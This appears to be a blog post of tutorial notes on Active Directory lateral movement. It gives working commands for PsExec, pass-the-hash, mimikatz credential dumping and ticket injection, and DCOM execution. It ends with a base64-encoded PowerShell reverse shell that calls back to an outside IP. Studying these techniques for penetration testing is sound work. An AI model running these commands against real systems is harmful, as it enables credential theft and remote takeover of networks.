---
layout: post
title: Active Directory Lateral Movement Cont.
titledate: 09/29/23
tags: ["infosec", "offsec", "AD", "powershell", "psexec", "pth", "mimikatz"]
---

#### psexec

requirements: to use this tool for lateral movement
- the user that authenticates to the target machine needs to be part of the Admin local group
- the ADMIN$ share must be available
- File and Printer Sharing has to be turned on

we can transfer the psexec binary to our compromised target

    C:> ./PsExec64.exe -i  \\web04 -u corp\jim -p Nexus123! cmd

#### pass the hash 

pth uses NTLM authentication to obtain code execution with a user's hash

like PsExec, this technique requires an SMB connection through the firewall and the Windows File and Printer Sharing features enabled

    $ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E admin@192.168.1.1

#### overpass the hash

in opth we use a user's NTLM hash to get a kerberos TGT then use TGT to get a Ticket Granting Service

assume we have compromised userB and have received their NTLM hash

if we log on to a system as usersA and run something like notepad and enter userB's creds we will now have userB's creds cached on this system

we can use mimikatz to validate this

    mimikatz# privilege::debug

    mimikatz# sekurlsa::logonpasswords

the goal of this technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication

let's do this with mimikatz

    mimikatz# sekurlsa::pth /user:jim /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

this allows us to run a powershell process as jen 

now in the PS prompt

    PS> klist

if we do not have any tickets cached we may have to perform a logon

let's create a cached ticket by trying to authenticate to a network share

    PS> net use \\files04

    PS> klist

#### pass the ticket

in this example we are logged in as userA and will abuse already existing session of userB which has privs to a backup folder on a share share01 and userA does no have privs.

    PS> ls \\share01

    > Access Denied for userA

    mimikatz# privilege::debug

now export the TGT/TGS ticets

    mimikatz# sekurlsa::tickets /export

inspecting the ticket output we can see userB has already create a session

    PS> dir *.kirbi

looking at the tickets we can pick any ticket that matches our format and inject it through mimikatz

    mimikatz# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-share01.kirbi

now if we try to access the share

    ls \\share01

we should have access by having injected userB's ticket into our user's session

#### DCOM

COM and DCOM are old windows technologies , DCOM is RPC over 135 

from admin PowerShell - the ip of the share we want to laterally move to

    PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.1"))

now we can execute a command using the dcom variable

    PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

now we can upgrade our calc poc to a reverse shell payload

    PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64encodepowrshellreverseshell","7")

using the python encode.py script to base64 encode our reverse shell

    $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")

this should get us a foothold on a different share through DCOM lateral movement
